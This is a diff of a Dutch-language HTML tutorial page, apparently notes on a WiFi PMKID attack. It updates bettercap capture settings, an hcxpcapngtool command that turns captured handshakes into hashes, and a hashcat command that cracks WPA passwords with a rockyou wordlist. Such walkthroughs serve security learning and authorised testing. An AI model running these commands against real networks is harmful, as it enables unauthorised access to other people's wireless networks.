@@ -88,8 +88,9 @@ PCAP bestand.</p>
 </ol></p>
 
 <h1>PMKID attack</h1>
-<p>PMKID (Pairwise Master Key IDentifier) attack kan zonder verbonden clients met de AP.</p>
+<p>PMKID (Pairwise Master Key IDentifier) attack kan zonder verbonden clients met de AP</p>
 <p><ol>
+    <ul>set wifi.handshakes.file /home/kali/Downloads/handshakes.pcap</ul>
   <ul>wifi.recon on</ul>
   <ul>set wifi.show.sort clients desc</ul>
   <ul>set ticker.period 10</ul>
@@ -102,7 +103,7 @@ PCAP bestand.</p>
 <p><b><i>(eapol && wlan.rsn.ie.pmkid)</i></b></p>
 <h2>PCAP omzetten naar PMKID</h2>
 <p>Vervolgens zetten we het PCAP bestand om in een PMKID bestand waarin alle gevonden hashes vermeld worden:</p>
-<p><b><i>sudo hcxpcaptool -z /home/user/Downloads/handshakes.pmkid /root/bettercap-wifi-handshakes.pcap</i></b></p>
+<p><b><i>sudo hcxpcapngtool -o /home/user/Downloads/handshakes.pmkid /home/kali/Downloads/handshakes.pcap</i></b></p>
 <h2>Wachtwoorden kraken met hashcat</h2>
 <p><b><i>hashcat -m 22000 /usr/home/handshakes.pmkid -a 0 --kernel-accel=1 -w 4 --force 'rockyou.txt'</i></b></p>
 <p>Zodra hashcat een wachtwoord heeft recovered dan wordt deze in de console getoond als:</p>
